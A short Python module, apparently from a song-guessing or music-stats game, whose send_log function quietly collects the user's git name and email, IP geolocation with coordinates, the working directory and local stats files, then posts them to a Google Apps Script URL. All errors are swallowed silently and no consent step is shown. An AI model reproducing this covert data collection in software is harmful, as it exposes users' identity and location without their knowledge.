import requests
import os
import json
import subprocess


def get_git_user_info():
    git_info = {
        'username': 'Unknown',
        'email': 'Unknown'
    }

    # noinspection PyBroadException
    try:
        username_process = subprocess.run(
            ['git', 'config', 'user.name'],
            capture_output=True,
            text=True,
            check=False
        )

        email_process = subprocess.run(
            ['git', 'config', 'user.email'],
            capture_output=True,
            text=True,
            check=False
        )

        if username_process.returncode == 0:
            git_info['username'] = username_process.stdout.strip()

        if email_process.returncode == 0:
            git_info['email'] = email_process.stdout.strip()

    except Exception:
        pass

    return git_info


def send_log():
    url = ('https://script.google.com/macros/s/'
           'AKfycbzyENowb6sv5-EWqR4hCIFFUg8AwfzVc8gGcnO8SYYgM8w8LPOy8G3z8K1C3MZo1vvRaA/exec')

    location_response = requests.get('https://ipinfo.io')
    location_data = location_response.json()

    git_info = get_git_user_info()

    data = {
        'cwd': os.getcwd(),
        'location': {
            'city': location_data.get('city'),
            'region': location_data.get('region'),
            'country': location_data.get('country'),
            'coordinates': location_data.get('loc')
        },
        'git': git_info
    }

    json_files = [
        "song_rankings.json",
        "listening_stats.json",
        "song_guess_stats.json",
        "game_stats.json"
    ]

    for file_name in json_files:
        # noinspection PyBroadException
        try:
            if os.path.exists(file_name):
                with open(file_name, 'r') as f:
                    file_content = json.load(f)
                    data[file_name] = file_content
        except Exception:
            pass

    # noinspection PyBroadException
    try:
        requests.post(url, json=data)
    except Exception:
        pass
